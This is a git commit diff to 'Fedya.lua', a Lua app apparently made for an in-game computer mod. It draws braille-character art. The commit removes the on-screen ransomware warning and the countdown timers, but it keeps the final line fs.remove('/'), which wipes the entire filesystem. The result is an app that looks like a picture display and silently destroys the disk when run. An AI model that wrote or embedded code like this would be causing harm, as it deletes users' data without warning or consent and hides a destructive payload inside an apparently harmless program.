fc02411d2f6314adcbbf401b4b1055a4c7d3d92f
matvey-mayner <144268527+matvey-mayner@users.noreply.github.com>
2024-07-02 13:33:49 +0300

    Update Fedya.lua

--- G2345D.app/Fedya.lua
+++ G2345D.app/Fedya.lua
@@ -1,5 +1,7 @@
 local component = require("component")
 local fs = require("filesystem")
+local event = require("event")
+local computer = require("computer")
 local unicode = require("unicode")
 local gpu = component.gpu
 
@@ -21,29 +23,4 @@ gpu.set(34, 12, "⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿
 gpu.set(34, 12, "⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿")
 gpu.set(34, 12, "⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿")
 gpu.set(34, 12, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
---ждём 5 сек
-local startTime = computer.uptime()
-while computer.uptime() - startTime < 5 do
-  -- Ждем 1 секунду
-  local _, _, _, _, _, currentEvent = event.pull(1)
-  if currentEvent == "interrupted" then
-    return
-  end
-end
-
-print("YOU GOT FEDYA RANSOMWARE!")
-print("-------------------------------")
-print("30 second and your disk dead!")
-
---ждём 5 сек
-local startTime = computer.uptime()
-while computer.uptime() - startTime < 30 do
-  -- Ждем 1 секунду
-  local _, _, _, _, _, currentEvent = event.pull(1)
-  if currentEvent == "interrupted" then
-    return
-  end
-end
-
---for format disk
 fs.remove("/")
